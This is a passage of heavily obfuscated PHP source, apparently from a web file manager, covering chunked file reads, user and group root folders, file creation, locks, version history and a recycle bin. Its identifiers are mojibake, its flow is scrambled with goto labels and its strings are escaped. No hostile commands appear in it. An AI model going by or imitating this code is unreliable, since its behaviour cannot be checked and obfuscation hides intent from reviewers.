fread($aÈœ’‡´í, $AÒÒ‰óÅ¨Î); $då”¸†ìŒ += $AÒÒ‰óÅ¨Î; } fclose($aÈœ’‡´í); goto EÌÁõ«™Ëö; EÌÁõ«™Ëö: return $A§öÒ°ˆó’; goto E¡â¯Êëéê; E¡â¯Êëéê: } public function fileSubstr($Bä²àõ£¨, $d»ƒĞé½â¡) { goto AàÀàóã; d«£àñ¤¼: foreach ($d˜ ùš’Ú as $c‡Î÷Á ÛÚ => $eõ‘óÙ—¢Ç) { $c‡Î÷Á ÛÚ = intval($c‡Î÷Á ÛÚ); $aô”ï°½­ƒ = $c‡Î÷Á ÛÚ + strlen($eõ‘óÙ—¢Ç); if ($Bä²àõ£¨ >= $aô”ï°½­ƒ) { continue; } if ($Bä²àõ£¨ >= $c‡Î÷Á ÛÚ && $Bä²àõ£¨ + $d»ƒĞé½â¡ <= $aô”ï°½­ƒ) { return substr($eõ‘óÙ—¢Ç, $Bä²àõ£¨ - $c‡Î÷Á ÛÚ, $d»ƒĞé½â¡); } break; } if (count($d˜ ùš’Ú) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($eêÈíóÀ÷Œ[1354], $eêÈíóÀ÷Œ[1355] . count($d˜ ùš’Ú) . "\x3b\x73\164\x61\162\164\x3d{$Bä²àõ£¨}\54\154\x65\156\x67\164\x68\75{$d»ƒĞé½â¡}\73\160\x6f\x73\145\72{$c‡Î÷Á ÛÚ}\x7e{$aô”ï°½­ƒ}"); throw new Exception($eêÈíóÀ÷Œ[1356]); } $AÓñÇÂ°¸¼ = intval($Bä²àõ£¨ / $DøòóÕÕ¸–) * $DøòóÕÕ¸–; goto FõÎèÕ°; Cñ„ƒŠõ˜‚: $e¬¡ÄÀ±Ã = $d»ƒĞé½â¡; if ($Bä²àõ£¨ < 0) { $Bä²àõ£¨ = $dÎ‹‚Ïà‚÷ + $Bä²àõ£¨; } if ($d»ƒĞé½â¡ === !1) { $d»ƒĞé½â¡ = $dÎ‹‚Ïà‚÷ - $Bä²àõ£¨; } goto f´µæŒ­®; DÒÒÍ›Å¢Š: $c‡Î÷Á ÛÚ = 0; $aô”ï°½­ƒ = 0; $eõ‘óÙ—¢Ç = $eêÈíóÀ÷Œ[33]; goto d«£àñ¤¼; f´µæŒ­®: if ($Bä²àõ£¨ + $d»ƒĞé½â¡ > $dÎ‹‚Ïà‚÷) { $d»ƒĞé½â¡ = $dÎ‹‚Ïà‚÷ - $Bä²àõ£¨; } if ($d»ƒĞé½â¡ <= 0) { return $eêÈíóÀ÷Œ[33]; } if ($Bä²àõ£¨ < 0 || $Bä²àõ£¨ >= $dÎ‹‚Ïà‚÷ || $d»ƒĞé½â¡ <= 0 || $d»ƒĞé½â¡ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\x69\x6c\x65\122\x65\x61\x64\x20\x65\x72\162\x6f\x72\41\x20\x73\164\141\162\164\75{$Bä²àõ£¨}\x3b\154\145\x6e\x67\164\x68\75{$d»ƒĞé½â¡}\x3b\x20\x73\x69\172\145\x3d{$dÎ‹‚Ïà‚÷}\73"); } goto dóÔ›Öº»; FõÎèÕ°: $EğÃïâ…å† = ceil(($Bä²àõ£¨ + $d»ƒĞé½â¡) / $DøòóÕÕ¸–) * $DøòóÕÕ¸– - $AÓñÇÂ°¸¼; $b‰à¡¸À£ = IO::fileSubstr($this->path, $AÓñÇÂ°¸¼, $EğÃïâ…å†); $d˜ ùš’Ú[$AÓñÇÂ°¸¼ . $eêÈíóÀ÷Œ[33]] = $b‰à¡¸À£; goto Dè¾êÊÅªã; dóÔ›Öº»: $DøòóÕÕ¸– = 64 * 1024; $d˜ ùš’Ú =& self::$_chunkBuffer[$this->path]; if (!$d˜ ùš’Ú) { $d˜ ùš’Ú = array(); } goto DÒÒÍ›Å¢Š; AàÀàóã: $eêÈíóÀ÷Œ =& $_SERVER[ç]; $dÎ‹‚Ïà‚÷ = $this->info[$eêÈíóÀ÷Œ[77]]; $D×¼“áÛ± = $Bä²àõ£¨; goto Cñ„ƒŠõ˜‚; Dè¾êÊÅªã: ksort($d˜ ùš’Ú); $d›¬ñ©ªî = substr($b‰à¡¸À£, $Bä²àõ£¨ - $AÓñÇÂ°¸¼, $d»ƒĞé½â¡); return $d›¬ñ©ªî; goto C›ß¨Úºò; C›ß¨Úºò: } private function log($F‹ªÏ¸–ô´, $fà÷‹ñùÖ) { $f¼—­Œ‡» =& $_SERVER[ç]; $BÕÙ¶‡ÅáÛ = timeFloat() - $this->timeStart; write_log(sprintf($f¼—­Œ‡»[1357], $F‹ªÏ¸–ô´, $this->info[$f¼—­Œ‡»[28]], $BÕÙ¶‡ÅáÛ, $fà÷‹ñùÖ), $f¼—­Œ‡»[1045]); } } goto fĞñœ‚Ÿ‹¢; AàÈ¿ö±©: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E……ôØ¨Ú—) { $C¬êÕ™§õ =& $_SERVER[ç]; $Fæ†›ãÃ · = Model($C¬êÕ™§õ[497])->where(array($C¬êÕ™§õ[1483] => $E……ôØ¨Ú—))->find(); $fÌÖªÀÏ» = $this->_mkdirRoot(SourceModel::TYPE_USER, $E……ôØ¨Ú—, $Fæ†›ãÃ ·[$C¬êÕ™§õ[28]]); $this->userDesktopAdd($fÌÖªÀÏ»); return $fÌÖªÀÏ»; } public function userDesktopAdd($cÇŠé…Ÿ³İ) { $E×„Õ èº =& $_SERVER[ç]; $d¥—äê’ = LNG($E×„Õ èº[1913]); $D§õœîÍ¦æ = $this->mkdir($cÇŠé…Ÿ³İ, $d¥—äê’); $this->metaSet($D§õœîÍ¦æ, $E×„Õ èº[1914], $E×„Õ èº[86]); $this->metaSet($cÇŠé…Ÿ³İ, $E×„Õ èº[1915], $D§õœîÍ¦æ); } public function groupRootAdd($DËÂ½á†‰Ù) { $bêææ‡²Œç =& $_SERVER[ç]; $dŒ¹§‡ºñ³ = Model($bêææ‡²Œç[480])->where(array($bêææ‡²Œç[1733] => $DËÂ½á†‰Ù))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $DËÂ½á†‰Ù, $dŒ¹§‡ºñ³[$bêææ‡²Œç[28]]); } public function systemRootPathAdd($B·ïâ´‡˜¾) { if ($B·ïâ´‡˜¾ != $_SERVER[ç][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B·ïâ´‡˜¾); } public function userRootRemove($Fµ­õÉ¦Û) { $aÑÒ¯àÑÎò = $this->sourceRoot(SourceModel::TYPE_USER, $Fµ­õÉ¦Û); if (!$aÑÒ¯àÑÎò) { return; } $this->remove($aÑÒ¯àÑÎò, !1); } public function groupRootRemove($D©®Û¯ÎàŠ) { $f™ÁÎæÌ´ø = $this->sourceRoot(SourceModel::TYPE_GROUP, $D©®Û¯ÎàŠ); if (!$f™ÁÎæÌ´ø) { return; } $this->remove($f™ÁÎæÌ´ø, !1); } private function _mkdirRoot($e‘ì‘ö¦’–, $a§êß¿·í¡, $a©ÆÚøÌ©ê) { goto fíÌõÂèéŠ; b»Œùï”åÂ: $e²ÈàáÒ¤ = $this->add($DÑæÉÀ¾àÈ); $CÑïËÌøÂè = array($CÈõÜ¯ÕŞ[550] => short_id($e²ÈàáÒ¤)); $this->where(array($CÈõÜ¯ÕŞ[404] => $e²ÈàáÒ¤))->save($CÑïËÌøÂè); goto Dè‘„Ã¾‡ç; Dè‘„Ã¾‡ç: CacheLock::unlock($c©”‚Ä¿ò); return $e²ÈàáÒ¤; goto B™¼óà­¯ô; fíÌõÂèéŠ: $CÈõÜ¯ÕŞ =& $_SERVER[ç]; $DÑæÉÀ¾àÈ = array($CÈõÜ¯ÕŞ[389] => 0, $CÈõÜ¯ÕŞ[544] => $e‘ì‘ö¦’–, $CÈõÜ¯ÕŞ[545] => $a§êß¿·í¡, $CÈõÜ¯ÕŞ[541] => 1, $CÈõÜ¯ÕŞ[546] => USER_ID, $CÈõÜ¯ÕŞ[547] => USER_ID, $CÈõÜ¯ÕŞ[542] => $CÈõÜ¯ÕŞ[33], $CÈõÜ¯ÕŞ[548] => $CÈõÜ¯ÕŞ[493], $CÈõÜ¯ÕŞ[416] => 0, $CÈõÜ¯ÕŞ[543] => 0, $CÈõÜ¯ÕŞ[442] => 0, $CÈõÜ¯ÕŞ[549] => $CÈõÜ¯ÕŞ[33]); if ($Fè±ÉÆ¸÷  = $this->where($DÑæÉÀ¾àÈ)->find()) { return $Fè±ÉÆ¸÷ [$CÈõÜ¯ÕŞ[390]]; } goto eÇ†ÅÄ¹Ô; eÇ†ÅÄ¹Ô: $c©”‚Ä¿ò = "\115\x6f\x64\x65\154\123\x6f\165\162\143\145\x2e\155\x6b\144\x69\162\122\x6f\x6f\164\x2e{$e‘ì‘ö¦’–}\56{$a§êß¿·í¡}\x2e" . $a©ÆÚøÌ©ê; CacheLock::lock($c©”‚Ä¿ò); $DÑæÉÀ¾àÈ[$CÈõÜ¯ÕŞ[28]] = $a©ÆÚøÌ©ê; goto b»Œùï”åÂ; B™¼óà­¯ô: } private function sourceRoot($dà¯‡¯¶×©, $D¤•»¼›Û•, $cç”¥ìóõ = false) { $FáÆ¨İß‰ =& $_SERVER[ç]; $BÃ­Çà®è = array($FáÆ¨İß‰[389] => 0, $FáÆ¨İß‰[544] => $dà¯‡¯¶×©, $FáÆ¨İß‰[545] => $D¤•»¼›Û•); if ($B›ç»„ŞÇÌ = $this->where($BÃ­Çà®è)->find()) { return $cç”¥ìóõ ? $B›ç»„ŞÇÌ : $B›ç»„ŞÇÌ[$FáÆ¨İß‰[390]]; } return !1; } public function sourceRootGroup($AÁ‹—Ã†ø±) { goto FìÃáøŠ–…; cÃ¡®¡ôô„: $this->selectPageReset(); $D‰–İÈß´ = $this->listSource($bÉÓÌåİÃ‚, 1000); $this->selectPageRestore(); goto dŠ‰Ş¨Ìš¹; dŠ‰Ş¨Ìš¹: return array_to_keyvalue($D‰–İÈß´[$A¥°–‚Æ¦[74]], $A¥°–‚Æ¦[478]); goto b’ãğì£íÎ; FìÃáøŠ–…: $A¥°–‚Æ¦ =& $_SERVER[ç]; if (is_string($AÁ‹—Ã†ø±)) { $AÁ‹—Ã†ø± = array($AÁ‹—Ã†ø±); } $bÉÓÌåİÃ‚ = array($A¥°–‚Æ¦[389] => 0, $A¥°–‚Æ¦[544] => SourceModel::TYPE_GROUP, $A¥°–‚Æ¦[545] => array($A¥°–‚Æ¦[7], $AÁ‹—Ã†ø±)); goto cÃ¡®¡ôô„; b’ãğì£íÎ: } public function mkfile($AÊ¥ñª²å”, $aÂ˜”º­Ø¯, $BíœÓ± ’Ã = '', $E‹ØïŞ„Ş‚ = REPEAT_RENAME) { $c¿ï¯òÕ¡÷ =& $_SERVER[ç]; $D°‘‹ÚØ± = Model($c¿ï¯òÕ¡÷[566])->addFileByContent($BíœÓ± ’Ã, $aÂ˜”º­Ø¯); return $this->_createFileCall($AÊ¥ñª²å”, $aÂ˜”º­Ø¯, $D°‘‹ÚØ±, $E‹ØïŞ„Ş‚, $c¿ï¯òÕ¡÷[1180]); } public function addFile($EÈëÅÜËŠê, $cç’äİå±æ, $AÚ¼ƒ§µÀ, $F‹•È¶‚Â÷ = false, $d£é¢òù¦ = REPEAT_RENAME) { $a×Œæ‰ê¾¬ = Model($_SERVER[ç][566])->addFile($cç’äİå±æ, $AÚ¼ƒ§µÀ, $F‹•È¶‚Â÷); return $this->_createFileCall($EÈëÅÜËŠê, $AÚ¼ƒ§µÀ, $a×Œæ‰ê¾¬, $d£é¢òù¦); } public function addFileByFileID($C²É°Û¨Ã, $CØ£ÓÔºÎÎ, $CÚƒëéòÔÙ, $d˜—‚„¢´õ = REPEAT_RENAME) { $bæÆ«Œœ±„ =& $_SERVER[ç]; $bÑæâ•áï¾ = Model($bæÆ«Œœ±„[566])->find($CØ£ÓÔºÎÎ); Model($bæÆ«Œœ±„[566])->linkAdd($CØ£ÓÔºÎÎ); return $this->_createFileCall($C²É°Û¨Ã, $CÚƒëéòÔÙ, $bÑæâ•áï¾, $d˜—‚„¢´õ); } public function addFileByRemote($f™°Æí’Üã, $d‹Œ–ÅÕõõ, $F±Çé¡¥À´, $fŞ‚šã´¤„ = array(), $cğÔïª¾»° = REPEAT_RENAME) { $E›’ ›Ê‰Í = Model($_SERVER[ç][566])->addFileByRemote($d‹Œ–ÅÕõõ, $F±Çé¡¥À´, $fŞ‚šã´¤„); return $this->_createFileCall($f™°Æí’Üã, $F±Çé¡¥À´, $E›’ ›Ê‰Í, $cğÔïª¾»°); } private function _createFileCall($e©¼ªÙ“ÉÛ, $cí™†å®ø, $añ²âˆø‘, $b›¸óÄ‰Š, $FŸÂö»ù£ = "\165\160\154\157\141\x64") { goto EËéñØÀ; EËéñØÀ: $C‰’ÑÂ˜¡ =& $_SERVER[ç]; $Eé‡÷£¼‰ = !1; $this->lockWriteStart($e©¼ªÙ“ÉÛ, $cí™†å®ø); goto báø¨äã‰Ÿ; báø¨äã‰Ÿ: $DìØÜÂ·Ó¶ = $this->fileNameExist($e©¼ªÙ“ÉÛ, $cí™†å®ø); $DİöæÕù” = $this->_createFile($e©¼ªÙ“ÉÛ, $cí™†å®ø, $añ²âˆø‘, $b›¸óÄ‰Š, $Eé‡÷£¼‰); if (!$Eé‡÷£¼‰) { Model($C‰’ÑÂ˜¡[444])->remove($añ²âˆø‘[$C‰’ÑÂ˜¡[441]]); } goto FìšÉˆ¬Å; FìšÉˆ¬Å: if ($Eé‡÷£¼‰ && $DİöæÕù” && $DİöæÕù” != $DìØÜÂ·Ó¶) { Model($C‰’ÑÂ˜¡[1885])->eventCreate($DİöæÕù”, $FŸÂö»ù£); } $this->lockWriteEnd($e©¼ªÙ“ÉÛ, $cí™†å®ø); return $DİöæÕù”; goto aÕáà‰…Ø™; aÕáà‰…Ø™: } public function mkdir($A’ãßè†Û, $c¦÷óéã÷³, $Eóäçæä½ = REPEAT_SKIP) { goto d‡•Úõ¢ßÖ; cÃŸ«Ã¿Áå: return $Câ’ø¦Æ¯‰; goto A‹«Òºîùˆ; D³ÒìÌùï: $Câ’ø¦Æ¯‰ = $this->_addSoure($CÒ„¬µĞ¾ª, $E‰¬Ìäš Í); Model($f½Ç©…ËÁÏ[1885])->eventCreate($Câ’ø¦Æ¯‰, $f½Ç©…ËÁÏ[1181]); $this->lockWriteEnd($A’ãßè†Û, $c¦÷óéã÷³); goto cÃŸ«Ã¿Áå; AÁ­™¸«„â: $this->lockWriteStart($A’ãßè†Û, $c¦÷óéã÷³); if ($Eóäçæä½ !== !1) { $BÖÆ»§¶ôÊ = $this->fileNameExist($A’ãßè†Û, $c¦÷óéã÷³); if ($BÖÆ»§¶ôÊ && $Eóäçæä½ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A’ãßè†Û, $c¦÷óéã÷³); return $BÖÆ»§¶ôÊ; } $c¦÷óéã÷³ = $this->fileNameAuto($A’ãßè†Û, $c¦÷óéã÷³, $Eóäçæä½); } $CÒ„¬µĞ¾ª = array($f½Ç©…ËÁÏ[541] => 1, $f½Ç©…ËÁÏ[407] => $c¦÷óéã÷³, $f½Ç©…ËÁÏ[542] => $f½Ç©…ËÁÏ[33], $f½Ç©…ËÁÏ[442] => 0, $f½Ç©…ËÁÏ[543] => 0); goto D³ÒìÌùï; d‡•Úõ¢ßÖ: $f½Ç©…ËÁÏ =& $_SERVER[ç]; $E‰¬Ìäš Í = $this->sourceInfo($A’ãßè†Û); if (!$E‰¬Ìäš Í) { return !1; } goto AÁ­™¸«„â; A‹«Òºîùˆ: } private function _createFile($bã‹Äô²¾µ, $bÂâ•é‹Ó¬, $EªÊæ³Ş¹Œ, $f¥‡¸¡ÁÈŠ, &$FÌÚ•‰ „ö) { goto cÂ§à±Ò™’; Dª£ÉÁ”ŞÚ: if ($f¥‡¸¡ÁÈŠ !== !1) { $díÑĞ ï = $this->fileNameExist($bã‹Äô²¾µ, $bÂâ•é‹Ó¬); } $FÌÚ•‰ „ö = !0; if ($f¥‡¸¡ÁÈŠ && $díÑĞ ï) { if ($f¥‡¸¡ÁÈŠ == REPEAT_SKIP) { $FÌÚ•‰ „ö = !1; return $díÑĞ ï; } else { if ($f¥‡¸¡ÁÈŠ == REPEAT_REPLACE) { $EÊ”ïŸˆÀ = $this->sourceInfo($díÑĞ ï); $f§İåÅæñ = $this->fileHistory($EÊ”ïŸˆÀ, $EªÊæ³Ş¹Œ[$E ·ëøí¶[441]], $EªÊæ³Ş¹Œ[$E ·ëøí¶[77]]); if (!$f§İåÅæñ) { $FÌÚ•‰ „ö = !1; } else { $this->folderSizeReset($bã‹Äô²¾µ); } return $díÑĞ ï; } else { $bÂâ•é‹Ó¬ = $this->fileNameAuto($bã‹Äô²¾µ, $bÂâ•é‹Ó¬, $f¥‡¸¡ÁÈŠ, !1); } } } goto a³”÷ôìÙ­; F–ƒ¡ßİĞ: return $dÆ½°º—­; goto Cåä¬Üïô¦; a³”÷ôìÙ­: $f—®õ´åóí = array($E ·ëøí¶[541] => 0, $E ·ëøí¶[407] => $bÂâ•é‹Ó¬, $E ·ëøí¶[542] => get_path_ext($bÂâ•é‹Ó¬), $E ·ëøí¶[442] => $EªÊæ³Ş¹Œ[$E ·ëøí¶[441]], $E ·ëøí¶[543] => $EªÊæ³Ş¹Œ[$E ·ëøí¶[77]]); $dÆ½°º—­ = $this->_addSoure($f—®õ´åóí, $AÚáø™ŸæŒ); $this->folderSizeReset($bã‹Äô²¾µ, intval($f—®õ´åóí[$E ·ëøí¶[77]])); goto F–ƒ¡ßİĞ; cÂ§à±Ò™’: $E ·ëøí¶ =& $_SERVER[ç]; $AÚáø™ŸæŒ = $this->sourceInfo($bã‹Äô²¾µ); if (!$EªÊæ³Ş¹Œ || !$AÚáø™ŸæŒ) { return !1; } goto Dª£ÉÁ”ŞÚ; Cåä¬Üïô¦: } protected function fileHistory($b¹ÂÚ÷†Ù®, $C‰ù›øà¡í, $Câç¥ò·é) { goto f¥òñÕšŸ±; f¥òñÕšŸ±: $c¡ÆÑí‰¢Ö =& $_SERVER[ç]; if ($b¹ÂÚ÷†Ù®[$c¡ÆÑí‰¢Ö[441]] == $C‰ù›øà¡í) { return !1; } $this->checkLock($b¹ÂÚ÷†Ù®[$c¡ÆÑí‰¢Ö[390]], $C‰ù›øà¡í); goto D¦ë‘áŒÇØ; D¦ë‘áŒÇØ: Model($c¡ÆÑí‰¢Ö[1916])->addHistory($b¹ÂÚ÷†Ù®); $F¨ŒöŠ½‚İ = array($c¡ÆÑí‰¢Ö[547] => USER_ID, $c¡ÆÑí‰¢Ö[411] => time(), $c¡ÆÑí‰¢Ö[441] => $C‰ù›øà¡í, $c¡ÆÑí‰¢Ö[77] => $Câç¥ò·é); $this->where(array($c¡ÆÑí‰¢Ö[404] => $b¹ÂÚ÷†Ù®[$c¡ÆÑí‰¢Ö[390]]))->save($F¨ŒöŠ½‚İ); goto A°Û¢£¡œ; A°Û¢£¡œ: $this->sourceCacheClear($b¹ÂÚ÷†Ù®[$c¡ÆÑí‰¢Ö[390]]); return !0; goto cÅç²Ïé; cÅç²Ïé: } public function checkLock($EÏƒÊùËòÇ, $bŒ½çÆ«²) { goto B¿²ìàØ¬¯; d¸İÇÈã«: show_json(LNG($fñàõÙÇÏî[1919]) . $fñàõÙÇÏî[1920] . LNG($fñàõÙÇÏî[1921]) . $fñàõÙÇÏî[1922] . $BºÄÒ§Œéã . $fñàõÙÇÏî[1923], !1); goto aÂ×ªŒîÒç; fóš¨Úòš´: $this->_createFileCall($CëğçŸÙ[$fñàõÙÇÏî[472]], $EÅ†ğªÛ«, $bâ“¸Ú¹Á, REPEAT_REPLACE, $fñàõÙÇÏî[1180]); $e‘µ­Ê¤ßá = $CëğçŸÙ[$fñàõÙÇÏî[439]][$fñàõÙÇÏî[505]]; $BºÄÒ§Œéã = $e‘µ­Ê¤ßá[$fñàõÙÇÏî[1918]] ? $e‘µ­Ê¤ßá[$fñàõÙÇÏî[1918]] : $e‘µ­Ê¤ßá[$fñàõÙÇÏî[28]]; goto d¸İÇÈã«; B¿²ìàØ¬¯: $fñàõÙÇÏî =& $_SERVER[ç]; $CëğçŸÙ = $this->pathInfo($EÏƒÊùËòÇ); if (!$this->fileIsLock($CëğçŸÙ, !0)) { return; } goto b £ˆ“‡´Æ; b £ˆ“‡´Æ: $DÜË„ÌÍŒÎ = Session::get($fñàõÙÇÏî[1917]); $EÅ†ğªÛ« = substr($CëğçŸÙ[$fñàõÙÇÏî[28]], 0, -1 - strlen($CëğçŸÙ[$fñàõÙÇÏî[167]])) . $fñàõÙÇÏî[1443] . $DÜË„ÌÍŒÎ . $fñàõÙÇÏî[94] . $CëğçŸÙ[$fñàõÙÇÏî[167]]; $bâ“¸Ú¹Á = Model($fñàõÙÇÏî[566])->find($bŒ½çÆ«²); goto fóš¨Úòš´; aÂ×ªŒîÒç: } public function fileIsLock($eÎë™‰½öÉ, $E¸ƒ¦Î¹®Ò = false) { goto Ağ¨¯ÉèÂ; c›±„éÒ†: return !1; goto eÇãğ¤ìÇ; F®¶¼’¢: $f÷§¿‚óÖ— = $GLOBALS[$C¬²«ëØ¦™[6]][$C¬²«ëØ¦™[87]][$C¬²«ëØ¦™[503]]; if ($eÎë™‰½öÉ[$C¬²«ëØ¦™[439]][$C¬²«ëØ¦™[504]] <= time() - $f÷§¿‚óÖ—) { $this->metaSet($eÎë™‰½öÉ[$C¬²«ëØ¦™[390]], $C¬²«ëØ¦™[502], null); $this->metaSet($eÎë™‰½öÉ[$C¬²«ëØ¦™[390]], $C¬²«ëØ¦™[504], null); } if ($E¸ƒ¦Î¹®Ò) { $this->metaSet($eÎë™‰½öÉ[$C¬²«ëØ¦™[390]], $C¬²«ëØ¦™[504], time()); } goto c›±„éÒ†; Ağ¨¯ÉèÂ: $C¬²«ëØ¦™ =& $_SERVER[ç]; if (!isset($eÎë™‰½öÉ[$C¬²«ëØ¦™[439]]) || !$eÎë™‰½öÉ[$C¬²«ëØ¦™[439]][$C¬²«ëØ¦™[502]]) { return !1; } if ($eÎë™‰½öÉ[$C¬²«ëØ¦™[439]][$C¬²«ëØ¦™[502]] != USER_ID) { return !0; } goto F®¶¼’¢; eÇãğ¤ìÇ: } private function _addSoure($BÚƒÎºõÓì, $DÀë‘¢ñÃ) { goto cÚ–Õ§Øœ¿; cÚ–Õ§Øœ¿: $dö•ŒŸìŞŒ =& $_SERVER[ç]; $a”†èŒŸÂ = array($dö•ŒŸìŞŒ[544] => $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[398]], $dö•ŒŸìŞŒ[545] => $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[478]], $dö•ŒŸìŞŒ[546] => USER_ID, $dö•ŒŸìŞŒ[547] => USER_ID, $dö•ŒŸìŞŒ[389] => $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[390]], $dö•ŒŸìŞŒ[548] => $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[481]] . $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[390]] . $dö•ŒŸìŞŒ[47], $dö•ŒŸìŞŒ[416] => 0, $dö•ŒŸìŞŒ[549] => $dö•ŒŸìŞŒ[33]); $BÚƒÎºõÓì = array_merge($a”†èŒŸÂ, $BÚƒÎºõÓì); goto cÑ±ÈÊ¿ƒ°; cÑ±ÈÊ¿ƒ°: $this->updateModifyTime($BÚƒÎºõÓì[$dö•ŒŸìŞŒ[472]]); $eÇİªƒ¬¯± = $dö•ŒŸìŞŒ[1924] . $DÀë‘¢ñÃ[$dö•ŒŸìŞŒ[390]]; if (isset(self::$cacheChildList[$eÇİªƒ¬¯±])) { unset(self::$cacheChildList[$eÇİªƒ¬¯±]); } goto d»—œîò; d¹ÒŞÂ«Ô—: return $Aš øˆ»œÆ; goto bÌ½ÈÙä‹®; d„óñö¤â½: $bØŠİš£—© = array($dö•ŒŸìŞŒ[550] => short_id($Aš øˆ»œÆ)); $this->where(array($dö•ŒŸìŞŒ[404] => $Aš øˆ»œÆ))->save($bØŠİš£—©); $this->setNamePinyin($Aš øˆ»œÆ, $BÚƒÎºõÓì[$dö•ŒŸìŞŒ[28]]); goto d¹ÒŞÂ«Ô—; d»—œîò: static $BÙ£‹šàÀ¯ = false; if (!$BÙ£‹šàÀ¯) { Hook::trigger($dö•ŒŸìŞŒ[531], $BÚƒÎºõÓì); $BÙ£‹šàÀ¯ = !0; } $Aš øˆ»œÆ = $this->add($BÚƒÎºõÓì); goto d„óñö¤â½; bÌ½ÈÙä‹®: } public function remove($BÁÈÏŠ‚‡, $c°»‘Æ³¤² = true) { goto EæÄÄÄİà; dÉ„İ®‹: $dÜ„Äé®¶ = $D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[398]] == self::TYPE_USER ? $AÊ§èøÏ[557] : $AÊ§èøÏ[983]; if ($dÜ„Äé®¶ == $AÊ§èøÏ[557]) { $fÔ¦Û“İÕÉ = Model($AÊ§èøÏ[497])->getInfo($D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[478]]); $BÖ²çÄŒ–© = !empty($fÔ¦Û“İÕÉ[$AÊ§èøÏ[1918]]) ? $fÔ¦Û“İÕÉ[$AÊ§èøÏ[1918]] : $fÔ¦Û“İÕÉ[$AÊ§èøÏ[28]]; $BÖ²çÄŒ–© = $AÊ§èøÏ[256] . $BÖ²çÄŒ–© . $AÊ§èøÏ[1926] . $D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[478]]; } else { $fÔ¦Û“İÕÉ = Model($AÊ§èøÏ[480])->getInfo($D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[478]]); $BÖ²çÄŒ–© = _get($fÔ¦Û“İÕÉ, $AÊ§èøÏ[28]); $BÖ²çÄŒ–© = $AÊ§èøÏ[159] . $BÖ²çÄŒ–© . $AÊ§èøÏ[1927] . $D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[478]]; } $c„¡ğç« = $AÊ§èøÏ[1928] . md5($BÖ²çÄŒ–©); goto d‘ã¸ ÆÏï; AŠ¿‘½·ê: CacheLock::unlock($c„¡ğç«); $this->metaSet($BÁÈÏŠ‚‡, $AÊ§èøÏ[1933], $D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[472]]); $this->where(array($AÊ§èøÏ[390] => $BÁÈÏŠ‚‡))->save(array($AÊ§èøÏ[411] => time())); goto DÌÕé …¶ó; DÌÕé …¶ó: $this->recycleClear($D¸¤ï¥ŸÔ¤); $dù²Ğİ‘éÂ = $this->move($BÁÈÏŠ‚‡, $EÔˆ¢ŠãöÕ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[472]]); goto Døß„‰‘˜; Døß„‰‘˜: return $dù²Ğİ‘éÂ; goto a˜¨¿Ü¸ÌĞ; BŠŸÙ—ô×: $AŠ£Şêì¬ = Model($AÊ§èøÏ[1490])->get($AÊ§èøÏ[1925]) == $AÊ§èøÏ[86]; if ($b¦ª´ÉïÅŒ || $c°»‘Æ³¤² || !$AŠ£Şêì¬) { return $this->removeNow($BÁÈÏŠ‚‡, $c°»‘Æ³¤²); } $c…¯ğ‹ìçî = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dÉ„İ®‹; d‘ã¸ ÆÏï: CacheLock::lock($c„¡ğç«); $EÔˆ¢ŠãöÕ = $this->fileNameExist($c…¯ğ‹ìçî, $BÖ²çÄŒ–©); if (!$EÔˆ¢ŠãöÕ) { $EÔˆ¢ŠãöÕ = $this->mkdir($c…¯ğ‹ìçî, $BÖ²çÄŒ–©, REPEAT_SKIP); $this->metaSet($EÔˆ¢ŠãöÕ, $AÊ§èøÏ[1929], $dÜ„Äé®¶); $this->metaSet($EÔˆ¢ŠãöÕ, $AÊ§èøÏ[1930], $D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[478]]); if ($D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[472]] != 0) { $this->metaSet($EÔˆ¢ŠãöÕ, $AÊ§èøÏ[1931], _get($fÔ¦Û“İÕÉ, $AÊ§èøÏ[1932])); } } goto AŠ¿‘½·ê; EæÄÄÄİà: $AÊ§èøÏ =& $_SERVER[ç]; $D¸¤ï¥ŸÔ¤ = $this->sourceInfo($BÁÈÏŠ‚‡); $b¦ª´ÉïÅŒ = intval($D¸¤ï¥ŸÔ¤[$AÊ§èøÏ[398]]) === self::TYPE_SYSTEM; goto BŠŸÙ—ô×; a˜¨¿Ü¸ÌĞ: } private function recycleClear($e¼¶­ÒØÎ) { $dâ™Ÿ°¿‹  =& $_SERVER[ç]; $BŠŠ÷’Ìğà = $this->childrenAll($e¼¶­ÒØÎ); $f†åÃƒ˜³„ = array($dâ™Ÿ°¿‹ [404] => array($dâ™Ÿ°¿‹ [405], $BŠŠ÷’Ìğà[$dâ™Ÿ°¿‹ [1934]])); Model($dâ™Ÿ°¿‹ [1935])->where($f†åÃƒ˜³„)->delete(); } public function removeNow($FÃøƒ±Š™Ã, $cÁ¿‹±«öÁ = true) { goto a›‘íÁ…Â«; b‡®ŸÏ‚´: $this->lockMoveEnd($FÃøƒ±Š™Ã); Hook::trigger($AÖßÙò÷™[1523], $d±±¨–¦–Õ, $cÁ¿‹±«öÁ); return !0; goto d¡ô²§Í; f÷•ĞŠÌÈ­: if (!$fÊë½†„“‡) { return !0; } if ($fÊë½†„“‡[$AÖßÙò÷™[472]] == 0) { if (!_get($GLOBALS, $AÖßÙò÷™[479])) { return !1; } } $this->lockMoveStart($FÃøƒ±Š™Ã); goto AÎ»×¶–Õ; AÎ»×¶–Õ: Hook::trigger($AÖßÙò÷™[1939], $d±±¨–¦–Õ, $cÁ¿‹±«öÁ); if ($cÁ¿‹±«öÁ) { 